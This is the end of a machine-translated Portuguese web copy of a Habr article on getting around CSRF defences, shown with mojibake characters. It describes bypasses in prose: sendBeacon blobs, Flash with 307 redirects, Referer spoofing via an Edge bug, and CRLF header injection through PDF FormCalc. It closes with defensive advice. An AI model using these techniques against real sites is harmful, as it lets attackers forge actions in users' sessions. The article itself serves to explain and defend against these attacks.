class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Criamos um novo blob com o tipo de conte√∫do desejado e simplesmente o enviamos usando Navigator.sendBeacon (). <br><br>  Outro cen√°rio de solu√ß√£o alternativa que ainda funciona e √© suportado nos navegadores √© ignorar usando o plug-in flash. <br><img src="https://habrastorage.org/webt/uv/dy/1x/uvdy1xpch21cebolskgfj6kk53q.jpeg"><br><br>  At√© mesmo no site <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">thehackerblog.com</a> , onde j√° existe uma unidade flash pronta, basta especificar o URL, o cabe√ßalho, o Tipo de conte√∫do desejado e os dados que voc√™ precisa transferir - voc√™ envia e uma solicita√ß√£o POST com o Tipo de conte√∫do desejado voa para o back-end. <br><br>  Mas h√° um truque: voc√™ n√£o pode simplesmente especificar o URL do site que estamos atacando.  Voc√™ precisa especificar o recurso que far√° o <strong>redirecionamento</strong> <strong>com o c√≥digo 307</strong> no recurso que estamos atacando.  Ent√£o vai funcionar. <br><br>  <strong>8. Indicador de par√≥dia</strong> <br><br>  A √∫ltima op√ß√£o para ignorar a prote√ß√£o CSRF √© baseada no Referer.  H√° um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">erro no</a> navegador <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Microsoft Edge</a> , que ainda n√£o foi corrigido e permite que voc√™ falsifique o valor do Referer.  Mas funciona, infelizmente, apenas para solicita√ß√µes GET.  Se o back-end atacado n√£o distingue GET do POST, esse bug pode ser explorado. <br><br>  Se ainda precisamos do POST, existe um pequeno truque.  Podemos enviar o referenciador de cabe√ßalho usando o plug-in PDF e o FormCalc. <br><img src="https://habrastorage.org/webt/yu/iu/vw/yuiuvwwn-xj4llbso7bhkscb7nc.jpeg"><br><br>  Cerca de um ano atr√°s, era poss√≠vel usar o plug-in PDF para enviar cabe√ßalhos em geral, incluindo host, mas a Adobe fechou essa possibilidade criando uma lista negra de cabe√ßalhos.  Ou seja, se especificarmos Referer no cabe√ßalho, esse cabe√ßalho simplesmente n√£o funcionar√°. <br><br>  Em geral, o FormCalc nos permite enviar legalmente qualquer Tipo de Conte√∫do.  Se inserirmos caracteres de retorno de carridge e avan√ßo de linha, podemos adicionar cabe√ßalhos adicionais √† solicita√ß√£o. <br><br>  O que acontece se implementarmos o cabe√ßalho <code>Referer http://example.com</code> ? <br><br>  √â claro que n√£o est√° na lista negra e um cabe√ßalho com o nome <code>Referer http://example.com</code> ser√° enviado ao back-end. <br><br>  Alguns servidores, como WildFly ou Jboss, tratam o <strong>espa√ßo</strong> como o final do nome do cabe√ßalho HTTP, ou seja, os dois pontos ` <strong>:</strong> `.  Assim, esses servidores ver√£o que o Referer chegou a eles com o valor <code>http://example.com</code> .  Ent√£o, substituiremos o Referer. <br><img src="https://habrastorage.org/webt/mb/7x/gu/mb7xgu42xmzrfmrgiane0pb_zck.jpeg"><br><br>  Esta √© a tabela de resumo.  As colunas fornecem prote√ß√£o contra o CSRF e as linhas fornecem solu√ß√µes alternativas.  Em cada c√©lula, os navegadores nos quais esse m√©todo funciona s√£o indicados: <br><br><ul><li>  Todos os meios para todos os navegadores; <br></li><li>  Todos * significa navegadores que n√£o suportam cookies SameSite, ou seja,  Tudo, exceto Chrome e Opera. <br></li></ul><br><img src="https://habrastorage.org/webt/e7/pg/-v/e7pg-vuidm5muwr1cifi0hthawu.jpeg"><br><br>  A op√ß√£o mais importante e eficaz para se proteger contra ataques de CSRF √© livrar-se de cookies e usar o cabe√ßalho com tokens. <br><br>  Mas se voc√™ ainda n√£o estiver pronto para desistir de cookies para gerenciar sua sess√£o de usu√°rio: <br><br><ul><li>  Modele amea√ßas e verifique a implementa√ß√£o da prote√ß√£o CSRF <strong><em>(consulte a tabela Resumo).</em></strong> <br></li><li>  Implemente cookies SameSite.  Agora, apenas dois navegadores suportam, mas no futuro, provavelmente, haver√° mais. <br></li><li>  Combine v√°rias defesas do CSRF - defesa em profundidade. <br></li><li>  Pe√ßa ao usu√°rio uma senha para executar a√ß√µes cr√≠ticas. <br></li><li>  Forne√ßa arquivos baixados pelo usu√°rio em um dom√≠nio separado. <br></li></ul><br><blockquote>  Em menos de seis meses, e a pr√≥xima alta carga em um m√™s - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Highload ++ Siberia</a> . <br><br>  Queremos chamar sua aten√ß√£o para alguns dos relat√≥rios selecionados: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Eu estou chorando por todos!</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Como integramos os sistemas de pagamento sem usar nosso pr√≥prio faturamento</a> / Anton Rusakov. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">njs - script JavaScript nativo em nginx</a> / Dmitry Volintsev. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PG Saga: altera√ß√µes de dados dependentes em v√°rios servi√ßos sem confirma√ß√µes bif√°sicas e depend√™ncias s√≠ncronas</a> / Konstantin Evteev. <br></li></ul><br></blockquote></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt412855/">https://habr.com/ru/post/pt412855/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt412843/index.html">Equ√≠vocos sobre batalhas espaciais</a></li>
<li><a href="../pt412845/index.html">Classifica√ß√£o das emo√ß√µes: no cora√ß√£o da computa√ß√£o emocional</a></li>
<li><a href="../pt412847/index.html">graphql - otimizando consultas ao banco de dados</a></li>
<li><a href="../pt412849/index.html">Os 8 melhores livros que vale a pena ler neste ver√£o</a></li>
<li><a href="../pt412853/index.html">V√≠deo do Badoo Techleads Meetup # 3: Sobre delega√ß√£o, integra√ß√£o, neg√≥cios e entrevistas em TI</a></li>
<li><a href="../pt412859/index.html">Autentica√ß√£o de dois fatores no Windows e criptografia de dados sem uma autoridade de certifica√ß√£o e dom√≠nio</a></li>
<li><a href="../pt412861/index.html">Criando um mapa de caminho do usu√°rio para manequins</a></li>
<li><a href="../pt412863/index.html">Dialogflower - Google Dialogflow para Yandex Alice</a></li>
<li><a href="../pt412865/index.html">Como fotografar uma c√¢mera Motion Eye na Sony Xperia XZ2</a></li>
<li><a href="../pt412867/index.html">Como compilar um arquivo COM do DOS pelo compilador GCC</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>